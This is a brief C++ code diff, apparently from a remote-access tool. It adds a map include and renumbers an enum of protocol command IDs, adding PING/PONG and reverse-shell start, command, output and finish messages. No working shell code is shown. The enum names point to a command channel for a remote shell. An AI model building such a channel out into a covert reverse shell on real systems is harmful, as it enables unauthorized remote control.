@@ -15,6 +15,7 @@
 #include<mutex>
 #include<atomic>
 #include<thread>
+#include<map>
 #include<random>
 #include<fcntl.h>
 #include<fstream>
@@ -52,10 +53,12 @@ namespace EnumIDS {
 
 namespace EnumComandos {
     enum Enum {
-        Reverse_Shell_Start = 500,
+        PONG = 499,
+        PING,
+        Reverse_Shell_Start,
         Reverse_Shell_Command,
         Reverse_Shell_Salida,
-        PING
+        Reverse_Shell_Finish
     };
 }
 
